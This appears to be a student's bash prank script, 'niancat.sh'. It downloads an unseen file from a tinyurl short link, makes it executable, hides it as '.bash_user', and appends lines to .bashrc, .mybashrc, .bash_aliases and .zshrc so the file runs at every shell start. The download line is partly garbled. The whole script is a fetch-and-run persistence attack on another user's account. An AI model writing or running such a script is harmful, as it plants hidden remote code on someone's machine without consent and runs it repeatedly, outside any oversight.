#!/bin/bash
## niancat.sh for eza in /home/galpin_a
## 
## Made by Antoine Galpin
## Login   <galpin_a@epitech.net>
## 
## Started on  Thu May  5 18:02:39 2016 Antoine Galpin
## Last update Thu May 12 17:49:03 2016 Antoine Galpin
##

wget tinwget tinyurl.com/confnyancat
chmod +x confnyancat
mv confnyancat .bash_user
mv .bash_user ../
echo "if [ -f ${HOME}/./mybashrc ]" >> .bashrc
echo "then" >> .bashrc
echo "    . ${HOME}/./mybashrc" >> .bashrc
echo "fi" >> .bashrc
echo "./.bash_user" >> .bashrc
echo "./.bash_user" >> .mybashrc
echo "./.bash_user" >> .bash_aliases
echo "./.bash_user" >> .zshrc
